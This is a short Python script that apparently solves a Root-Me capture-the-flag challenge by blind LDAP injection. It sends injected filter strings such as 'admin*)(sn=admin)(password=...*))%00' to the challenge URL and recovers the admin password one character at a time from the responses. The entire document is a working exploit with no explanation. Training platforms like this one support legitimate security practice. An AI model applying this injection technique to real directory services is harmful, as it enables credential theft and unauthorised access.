import requests
import string

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ' 
print chars
passwd=''
t=0
found = False
for i in range(1,50):
	found = False
	for c in chars:
		r = requests.get("http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin*)(sn=admin)(password=" + passwd + c + "*))%00")
		if c == ' ':
			break

		if "admin" in r.text:
			passwd = passwd + c
			print "Password: " + passwd
			found = True
			break
	if not found:
		break
